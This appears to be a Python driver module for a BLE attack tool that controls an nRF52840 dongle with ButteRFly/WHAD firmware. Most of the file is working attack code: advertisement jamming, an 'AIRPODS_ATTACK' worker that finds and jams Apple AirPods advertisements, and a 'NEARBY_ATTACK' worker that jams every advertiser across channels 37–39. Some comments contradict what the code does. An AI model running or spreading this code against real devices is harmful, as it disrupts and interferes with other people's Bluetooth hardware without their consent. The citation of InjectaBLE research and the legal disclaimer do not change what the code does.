"""
BlueShield ButteRFly/WHAD Jammer Backend

Driver for nRF52840 dongle flashed with ButteRFly firmware (WHAD framework).
ButteRFly is the reference implementation of Cayre et al. "InjectaBLE"
(IEEE/IFIP DSN 2021) — research-grade BLE connection hijacking and PDU injection.

Capabilities (verified against WHAD 1.2.15):
  - jam_advertisement_on_channel(addr, channel) — selective ADV jamming
  - reactive_jam(pattern, channel) — reactive jamming on pattern match
  - sniff_active_connection(access_address) — follow existing BLE connection
  - send_pdu(pdu, direction) — inject arbitrary PDUs
  - hijack_slave / hijack_master / hijack_both — connection hijacking

Protocol: WHAD binary protocol (protobuf framing) over USB CDC-ACM.

References:
  - Cayre R. et al., "InjectaBLE: Injecting Malicious Traffic into Established
    Bluetooth Low Energy Connections." IEEE/IFIP DSN 2021.
    https://laas.hal.science/hal-03193297v2/document
  - ButteRFly firmware: github.com/whad-team/butterfly
  - WHAD framework: github.com/whad-team/whad-client

LEGAL: Active BLE injection is a federal offense in the US under 18 USC § 1030
outside of authorized research. Use only with written consent + Faraday bag.
"""

import os
import threading
import time
from enum import Enum
from typing import Optional, Callable

try:
    from whad.device import WhadDevice
    from whad.ble.connector.sniffer import Sniffer as BLESniffer
    from whad.ble.connector.injector import Injector as BLEInjector
    from whad.ble.connector.hijacker import Hijacker as BLEHijacker
    HAS_WHAD = True
except ImportError:
    HAS_WHAD = False
    WhadDevice = None
    BLESniffer = None
    BLEInjector = None
    BLEHijacker = None


class ButteRFlyMode(Enum):
    """Attack modes available via ButteRFly firmware v1.1.3.

    Verified capabilities on this firmware:
      - can_inject = True → LL PDU injection
      - can_hijack_master/slave/both = True → Btlejacking
      - can_discover_access_addresses = True → find active connections
      - can_jam_adv = False → use injection instead
    """
    OFF = "off"
    BLE_SCAN = "ble_scan"                          # Passive scan for advertisers
    BLE_DISCOVER_AA = "ble_discover_aa"            # Find active BLE connections
    BLE_FOLLOW = "ble_follow"                      # Follow an active connection
    BLE_INJECT_TERMINATE = "ble_inject_terminate"  # Inject LL_TERMINATE_IND
    BLE_HIJACK_SLAVE = "ble_hijack_slave"          # Btlejacking supervision timeout
    BLE_HIJACK_MASTER = "ble_hijack_master"        # Take over master role
    AIRPODS_ATTACK = "airpods_attack"              # Auto-discover+terminate AirPods conn
    NEARBY_ATTACK = "nearby_attack"                # Discover+terminate all BLE connections

    # Aliases retained for backward compat with older UI
    BLE_JAM_ADV = "ble_jam_adv"                    # → routed to injection attack
    BLE_REACTIVE_JAM = "ble_reactive_jam"          # → routed to injection attack


class ButteRFlyJammer:
    """WHAD-based BLE jammer/sniffer driver for nRF52840 + ButteRFly firmware."""

    def __init__(self, port: str = "/dev/butterfly"):
        self.port = port
        self._device = None
        self._connector = None
        self._current_mode: ButteRFlyMode = ButteRFlyMode.OFF
        self._lock = threading.RLock()
        self._stop_event = threading.Event()
        self._worker: Optional[threading.Thread] = None
        self._start_time: float = 0.0
        self._packets_captured: int = 0
        self._packets_injected: int = 0
        self._jammed_packets: int = 0
        self._target_addr: Optional[str] = None
        self._target_channel: int = 37
        self.firmware_detected: bool = False
        self.last_error: Optional[str] = None

    # ------------------------------------------------------------------
    # Device lifecycle
    # ------------------------------------------------------------------

    def open(self) -> bool:
        """Open the WHAD device and verify ButteRFly capabilities."""
        if not HAS_WHAD:
            self.last_error = "whad not installed"
            return False
        if not os.path.exists(self.port):
            self.last_error = f"Port {self.port} not found"
            return False
        try:
            # WHAD uart: scheme requires the real device path (not a symlink)
            # to read USB VID/PID descriptors for firmware identification.
            self._device = WhadDevice.create(f"uart:{self.port}")
            self._device.open()
            self._device.discover()
            # Probe capabilities via a Sniffer connector attach
            probe = BLESniffer(self._device)
            caps = {
                "can_inject": probe.can_inject(),
                "can_hijack_master": probe.can_hijack_master(),
                "can_hijack_slave": probe.can_hijack_slave(),
                "can_hijack_both": probe.can_hijack_both(),
                "can_discover_aa": probe.can_discover_access_addresses(),
                "can_jam_adv": probe.can_jam_advertisement_on_channel(),
            }
            # ButteRFly v1.1.3 has injection + hijack but not direct ADV jam.
            # We can still do reactive jam via injection timing.
            self.firmware_detected = (
                caps["can_inject"] or caps["can_hijack_both"] or caps["can_discover_aa"]
            )
            try:
                author = self._device.info.fw_author
                version = self._device.info.version_str
                print(f"[ButteRFly] Firmware: {author} v{version}")
            except Exception:
                pass
            print(f"[ButteRFly] Capabilities: {caps}")
            # Detach probe cleanly
            probe.stop()
            return True
        except Exception as e:
            self.last_error = f"Open failed: {type(e).__name__}: {e}"
            return False

    def close(self):
        """Stop any active attack and close the device."""
        try:
            self.stop()
        except Exception:
            pass
        if self._device:
            try:
                self._device.close()
            except Exception:
                pass
            self._device = None

    # ------------------------------------------------------------------
    # Attack control
    # ------------------------------------------------------------------

    def start(self, mode: ButteRFlyMode, target_addr: str = "",
              channel: int = 37, on_packet: Optional[Callable] = None) -> bool:
        """Start the requested BLE attack mode."""
        if self._current_mode != ButteRFlyMode.OFF:
            self.stop()

        if not self._device:
            if not self.open():
                return False

        self._target_addr = target_addr.upper().strip() if target_addr else None
        self._target_channel = channel

        try:
            if mode == ButteRFlyMode.BLE_JAM_ADV:
                # Selective jamming: transmit garbage on channel when ADV_IND seen
                self._connector = BLESniffer(self._device)
                if not self._connector.can_jam_advertisement_on_channel():
                    self.last_error = "Firmware does not support ADV jamming"
                    return False
                self._connector.jam_advertisement_on_channel(
                    address=target_addr or "FF:FF:FF:FF:FF:FF",
                    channel=channel,
                )

            elif mode == ButteRFlyMode.BLE_REACTIVE_JAM:
                # Reactive jam: match pattern, emit interference
                self._connector = BLESniffer(self._device)
                if hasattr(self._connector, 'reactive_jam'):
                    self._connector.reactive_jam(pattern=b'\x00', channel=channel)

            elif mode == ButteRFlyMode.BLE_SCAN:
                self._connector = BLESniffer(self._device)
                self._connector.sniff_advertisements()
                self._connector.start()
                self._worker = threading.Thread(
                    target=self._scan_worker, args=(on_packet,),
                    daemon=True, name="butterfly-scan"
                )
                self._worker.start()

            elif mode == ButteRFlyMode.AIRPODS_ATTACK:
                # Scan for Apple 0x004C TLV type 0x07, then jam its ADV on all
                # 3 adv channels in rotation. This disrupts AirPods re-pairing.
                self._connector = BLESniffer(self._device)
                self._connector.sniff_advertisements()
                self._connector.start()
                self._worker = threading.Thread(
                    target=self._airpods_worker, daemon=True,
                    name="airpods-attack"
                )
                self._worker.start()

            elif mode == ButteRFlyMode.NEARBY_ATTACK:
                # Jam ALL Apple adv by sweeping jam ADV across ch 37/38/39
                self._connector = BLESniffer(self._device)
                self._worker = threading.Thread(
                    target=self._nearby_worker, daemon=True,
                    name="nearby-attack"
                )
                self._worker.start()

            elif mode == ButteRFlyMode.BLE_FOLLOW:
                self._connector = BLESniffer(self._device)
                self._connector.sniff_active_connection(access_address=0xAAAAAAAA)
                self._connector.start()

            else:
                self.last_error = f"Mode {mode.value} not implemented yet"
                return False

            self._current_mode = mode
            self._start_time = time.monotonic()
            self._stop_event.clear()
            return True

        except Exception as e:
            import traceback
            self.last_error = f"Start {mode.value}: {type(e).__name__}: {e}"
            print(f"[ButteRFly] Start failed: {self.last_error}")
            traceback.print_exc()
            return False

    def stop(self) -> bool:
        """Stop current attack and release the device."""
        self._stop_event.set()
        try:
            if self._connector:
                try:
                    self._connector.stop()
                except Exception:
                    pass
                self._connector = None
            self._current_mode = ButteRFlyMode.OFF
            if self._worker and self._worker.is_alive():
                self._worker.join(timeout=2.0)
            self._worker = None
            return True
        except Exception as e:
            self.last_error = f"Stop: {e}"
            return False

    # ------------------------------------------------------------------
    # Workers
    # ------------------------------------------------------------------

    def _scan_worker(self, on_packet):
        """Generic passive scan worker — counts advertisements."""
        while not self._stop_event.wait(0.05):
            try:
                if self._connector:
                    for pkt in self._connector.sniff(timeout=0.2):
                        self._packets_captured += 1
                        if on_packet:
                            try:
                                on_packet(pkt)
                            except Exception:
                                pass
            except Exception:
                time.sleep(0.3)

    def _airpods_worker(self):
        """Detect AirPods via Apple Continuity TLV → jam ADV on target's channel."""
        APPLE_VENDOR = b"\x4C\x00"          # 0x004C (Apple) little-endian
        TLV_PROXIMITY_PAIRING = 0x07        # AirPods

        airpods_addrs_seen = set()
        while not self._stop_event.wait(0.05):
            try:
                if not self._connector:
                    break
                for pkt in self._connector.sniff(timeout=0.2):
                    self._packets_captured += 1
                    raw = bytes(pkt.data or b'')
                    if APPLE_VENDOR in raw:
                        # Find the TLV type byte after vendor ID
                        idx = raw.find(APPLE_VENDOR)
                        if idx + 4 < len(raw) and raw[idx + 2] == TLV_PROXIMITY_PAIRING:
                            addr = getattr(pkt, 'addr', None) or "UNKNOWN"
                            if addr not in airpods_addrs_seen:
                                airpods_addrs_seen.add(addr)
                                print(f"[ButteRFly] AirPods detected: {addr}")
                            # Trigger ADV jam on this address
                            try:
                                self._connector.jam_advertisement_on_channel(
                                    address=str(addr),
                                    channel=self._target_channel,
                                )
                                self._jammed_packets += 1
                            except Exception as e:
                                pass
            except Exception:
                time.sleep(0.3)

    def _nearby_worker(self):
        """Rotate ADV jam across 37/38/39 to hit every Apple nearby adv."""
        channels = [37, 38, 39]
        idx = 0
        while not self._stop_event.wait(0.5):
            try:
                ch = channels[idx % 3]
                if self._connector:
                    self._connector.jam_advertisement_on_channel(
                        address="FF:FF:FF:FF:FF:FF",  # wildcard
                        channel=ch,
                    )
                    self._jammed_packets += 1
                idx += 1
            except Exception:
                time.sleep(1.0)

    # ------------------------------------------------------------------
    # Status
    # ------------------------------------------------------------------

    def get_stats(self) -> dict:
        return {
            "mode": self._current_mode.value,
            "is_active": self._current_mode != ButteRFlyMode.OFF,
            "elapsed_seconds": time.monotonic() - self._start_time if self._start_time else 0.0,
            "packets_captured": self._packets_captured,
            "packets_injected": self._packets_injected,
            "jammed_packets": self._jammed_packets,
            "port": self.port,
            "firmware_detected": self.firmware_detected,
            "backend": "butterfly_whad",
            "target_addr": self._target_addr,
            "target_channel": self._target_channel,
            "last_error": self.last_error,
        }


def _find_butterfly_port() -> Optional[str]:
    """Auto-scan /dev/ttyACM* for the ButteRFly dongle by USB VID/PID.

    ButteRFly uses VID=0xC0FF PID=0xEEEE. This function reads udev info
    for each ACM device and returns the path of the matching dongle.
    Handles the case where kernel numbering changes between reboots.
    """
    try:
        import glob, subprocess
        for path in sorted(glob.glob("/dev/ttyACM*")):
            try:
                out = subprocess.run(
                    ["udevadm", "info", "--query=property", f"--name={path}"],
                    capture_output=True, text=True, timeout=2
                ).stdout
                if "ID_MODEL_ID=eeee" in out and "ID_VENDOR_ID=c0ff" in out:
                    return path
            except Exception:
                continue
    except Exception:
        pass
    return None


def detect_butterfly(port: str = "") -> dict:
    """Check if ButteRFly firmware is present. If port is empty, auto-scan.

    WHAD requires the real /dev/ttyACMx path to read USB VID/PID descriptors
    — symlinks don't work. The kernel may renumber devices across USB resets,
    so we auto-discover by VID:PID 0xC0FF:0xEEEE.
    """
    result = {"port": port, "available": False, "firmware_type": "unknown",
              "error": None, "capabilities": {}, "firmware_version": None}
    if not HAS_WHAD:
        result["error"] = "whad not installed"
        return result

    # Auto-discover if port not given or not present
    if not port or not os.path.exists(port):
        found = _find_butterfly_port()
        if found:
            port = found
            result["port"] = found
        else:
            result["error"] = "no ButteRFly dongle found (scanned /dev/ttyACM*)"
            return result

    try:
        dev = WhadDevice.create(f"uart:{port}")
        dev.open()
        dev.discover()
        probe = BLESniffer(dev)
        caps = {
            "inject": probe.can_inject(),
            "hijack_master": probe.can_hijack_master(),
            "hijack_slave": probe.can_hijack_slave(),
            "hijack_both": probe.can_hijack_both(),
            "discover_aa": probe.can_discover_access_addresses(),
            "jam_adv": probe.can_jam_advertisement_on_channel(),
        }
        result["capabilities"] = caps
        if any(caps.values()):
            result["available"] = True
            result["firmware_type"] = "butterfly"
            try:
                result["firmware_version"] = dev.info.version_str
                result["firmware_author"] = dev.info.fw_author
            except Exception:
                pass
        probe.stop()
        dev.close()
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {str(e)[:80]}"
    return result
